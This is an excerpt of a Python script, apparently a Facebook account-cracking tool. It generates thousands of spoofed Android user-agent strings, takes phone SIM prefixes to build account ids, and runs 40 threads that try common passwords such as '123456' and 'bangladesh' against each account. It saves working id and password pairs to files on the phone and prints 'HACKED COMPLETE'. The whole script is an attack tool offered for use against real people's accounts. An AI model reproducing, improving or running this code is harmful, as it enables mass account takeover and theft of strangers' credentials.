...
ugen=[]
for ar in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.1.1','6.0','7','8','9'])
    c='SM-J3110 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,138)
    e='0'
...
for ar in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6.0','7.0','8','9','10'])
    c='Galaxy j5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(40,62)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
...
for ar in range(5000):
    ...
    c='Infinix X688B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
...
for ar in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['8','9','10','11','12','13','14','15'])
    c='SM-A045F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
...
def Alhajs():
    ...
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] [\033[1;32m013\033[1;31m] [\033[1;32m014\033[1;31m] \033[1;31m║")
    print("\033[1;91m╚════════════════════════════════════════════╝")
    ...
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] [\033[1;32m20000\033[1;31m] [\033[1;32m50000\033[1;31m]")
    print("\033[1;91m╚════════════════════════════════════════════╝")
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m Tool Winner 𝐀𝐒𝐇𝐈𝐊 ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'jannat','708090','908070','123456','bangla','bangladesh','i love you','a123456',]
            uid = code+love
            Fb_crack.submit(Alhajm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM 𝐀𝐒𝐇𝐈𝐊 ')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Alhajm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[1;92m𝐀𝐒𝐇𝐈𝐊\033[1;91m]🙄[\033[1;92m%s\033[1;91m]😞[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/𝐀𝐒𝐇𝐈𝐊-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/𝐀𝐒𝐇𝐈𝐊-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
